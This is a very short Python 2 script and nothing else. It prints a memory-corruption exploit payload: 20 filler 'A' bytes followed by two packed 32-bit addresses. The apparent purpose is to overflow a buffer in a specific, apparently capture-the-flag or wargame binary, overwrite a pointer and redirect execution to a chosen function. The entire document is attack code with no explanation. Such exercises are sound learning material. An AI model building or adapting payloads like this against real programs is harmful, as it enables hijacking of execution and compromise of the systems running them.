import struct;

print 20*"A" + struct.pack("I", 0x08049928) + " " + struct.pack("I", 0x080484f4)